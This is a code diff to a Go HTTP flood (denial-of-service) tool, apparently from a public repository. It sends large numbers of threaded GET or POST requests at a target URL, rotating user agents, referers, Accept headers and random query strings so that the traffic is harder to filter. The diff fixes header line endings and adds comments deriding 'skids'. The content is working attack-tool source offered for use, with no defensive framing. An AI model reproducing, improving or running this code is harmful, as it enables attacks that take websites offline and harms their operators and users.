@@ -1,5 +1,13 @@
+/*
+Coded by LeeOn123
+Please fking code ur script by ur self, kid.
 
+I changed the random integers range to the max of int32.
+Now 386 systems should work well.
 
+Looks like most people want to hit the url but not the host/ip.
+As a result, here you are.
+*/
 package main
 
 import (
@@ -24,56 +32,21 @@ var (
 	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
 	start     = make(chan bool)
 	acceptall = []string{
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-",
-		"Accept-Encoding: gzip, deflate
-",
-		"Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Charset: iso-8859-1
-Accept-Encoding: gzip
-",
-		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5
-Accept-Charset: iso-8859-1
-",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1
-Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
-Accept-Charset: utf-8, iso-8859-1;q=0.5
-",
-		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*
-Accept-Language: en-US,en;q=0.5
-",
-		"Accept: text/html, application/xhtml+xml, image/jxr, */*
-Accept-Encoding: gzip
-Accept-Charset: utf-8, iso-8859-1;q=0.5
-Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
-",
-		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
-Accept-Encoding: gzip
-Accept-Language: en-US,en;q=0.5
-Accept-Charset: utf-8, iso-8859-1;q=0.5
-",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
-Accept-Language: en-US,en;q=0.5
-",
-		"Accept-Charset: utf-8, iso-8859-1;q=0.5
-Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
-",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept-Encoding: gzip, deflate\r\n",
+		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 		"Accept: text/html, application/xhtml+xml",
-		"Accept-Language: en-US,en;q=0.5
-",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1
-",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5
-Accept-Charset: iso-8859-1
-"}
+		"Accept-Language: en-US,en;q=0.5\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
 	key     string
 	choice  = []string{"Macintosh", "Windows", "X11"}
 	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
@@ -109,7 +82,7 @@ Accept-Charset: iso-8859-1
 )
 
 func init() {
-	rand.Seed(time.Now().UnixNano())
+	rand.Seed(time.Now().UnixNano()) //fixed seed problem
 }
 func getuseragent() string {
 
@@ -142,7 +115,7 @@ func getuseragent() string {
 	return spider[rand.Intn(len(spider))]
 }
 
-func contain(char string, x string) int { 
+func contain(char string, x string) int { //simple compare
 	times := 0
 	ans := 0
 	for i := 0; i < len(char); i++ {
@@ -158,25 +131,18 @@ func flood() {
 	addr := host + ":" + port
 	header := ""
 	if mode == "get" {
-		header += " HTTP/1.1
-Host: "
-		header += addr + "
-"
+		header += " HTTP/1.1\r\nHost: "
+		header += addr + "\r\n"
 		if os.Args[5] == "nil" {
-			header += "Connection: Keep-Alive
-Cache-Control: max-age=0
-"
-			header += "User-Agent: " + getuseragent() + "
-"
+			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
+			header += "User-Agent: " + getuseragent() + "\r\n"
 			header += acceptall[rand.Intn(len(acceptall))]
-			header += referers[rand.Intn(len(referers))] + "
-"
+			header += referers[rand.Intn(len(referers))] + "\r\n"
 		} else {
 			func() {
 				fi, err := os.Open(os.Args[5])
 				if err != nil {
-					fmt.Printf("Error: %s
-", err)
+					fmt.Printf("Error: %s\n", err)
 					return
 				}
 				defer fi.Close()
@@ -186,8 +152,7 @@ Cache-Control: max-age=0
 					if c == io.EOF {
 						break
 					}
-					header += string(a) + "
-"
+					header += string(a) + "\r\n"
 				}
 			}()
 		}
@@ -197,8 +162,7 @@ Cache-Control: max-age=0
 			func() {
 				fi, err := os.Open(os.Args[5])
 				if err != nil {
-					fmt.Printf("Error: %s
-", err)
+					fmt.Printf("Error: %s\n", err)
 					return
 				}
 				defer fi.Close()
@@ -208,25 +172,16 @@ Cache-Control: max-age=0
 					if c == io.EOF {
 						break
 					}
-					header += string(a) + "
-"
+					header += string(a) + "\r\n"
 				}
 			}()
 
 		} else {
 			data = "f"
 		}
-		header += "POST " + page + " HTTP/1.1
-Host: " + addr + "
-"
-		header += "Connection: Keep-Alive
-Content-Type: x-www-form-urlencoded
-Content-Length: " + strconv.Itoa(len(data)) + "
-"
-		header += "Accept-Encoding: gzip, deflate
-
-" + data + "
-"
+		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
+		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
 	}
 	var s net.Conn
 	var err error
@@ -250,12 +205,12 @@ Content-Length: " + strconv.Itoa(len(data)) + "
 					request += "GET " + page + key
 					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
 				}
-				request += header + "
-"
+				request += header + "\r\n"
 				s.Write([]byte(request))
 			}
 			s.Close()
 		}
+		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
 	}
 }
 
@@ -282,7 +237,7 @@ func main() {
 	}
 	page = u.Path
 	if os.Args[3] != "get" && os.Args[3] != "post" {
-		println("Wrong mode, Only can use "get" or "post"")
+		println("Wrong mode, Only can use \"get\" or \"post\"")
 		return
 	}
 	mode = os.Args[3]
@@ -302,11 +257,13 @@ func main() {
 
 	for i := 0; i < threads; i++ {
 		time.Sleep(time.Microsecond * 100)
-		go flood()
-		fmt.Printf("-->[%.0f]", float64(i+1))
+		go flood() // Start threads
+		fmt.Printf("\r--> [%.0f]", float64(i+1))
 		os.Stdout.Sync()
+		//time.Sleep( time.Millisecond * 1)
 	}
 	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
 	close(start)
 	time.Sleep(time.Duration(limit) * time.Second)
+	//Keep the threads continue
 }
